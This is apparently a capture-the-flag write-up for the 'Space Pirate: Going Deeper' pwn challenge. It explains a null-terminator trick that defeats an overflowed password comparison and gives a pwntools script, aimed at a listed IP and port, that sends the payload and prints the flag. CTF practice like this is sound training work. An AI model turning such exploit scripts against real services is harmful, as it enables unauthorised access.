# Space Pirate: Going Deeper

> We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?

---

The binary's two inputs both allow the attacker to overwrite the length of the buffer, but not enough to be able to overwrite the instruction pointer.

The binary's source code leaks the password for retrieving the flag. However, the password is 51 bytes long, the buffer is only 40 bytes large, and the `read()` call attempts to write 52 bytes of the input into the buffer. Thus, by entering the password, the buffer is overflowed and the string comparison is done not with the password terminated by a null byte, but terminated by whatever bytes happen to follow it on the stack, causing the comparison to fail.

By sending the password terminated by a null byte, the string comparison will pass and the flag will be rendered.

```python
from pwnlib.tubes.remote import remote

hostname = "64.227.37.154"
port = 30042
r = remote(hostname, port, ssl=False)

# Grab the banner
banner = r.recvuntil(b'\x0a\x3e\x3e\x20')
print(banner.decode("utf-8"))

# Choose option #1, to "disable mechanisms"
r.sendline(b"1")
response = r.recvuntil(b"[*] Input: ")
print(response.decode(), end="")

# Input the password ending with a null byte
password = "DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft"
print(password)
r.sendline(password.encode() + b"\x00")

# Retrieve and print the flag
r.recvline()
flag = r.recvline().decode("utf-8")
print()
print(flag)
```

```bash
$ python3 exploit.py


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>>

[*] Input: DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft

[+] Welcome admin! The secret message is: HTB{...}
```
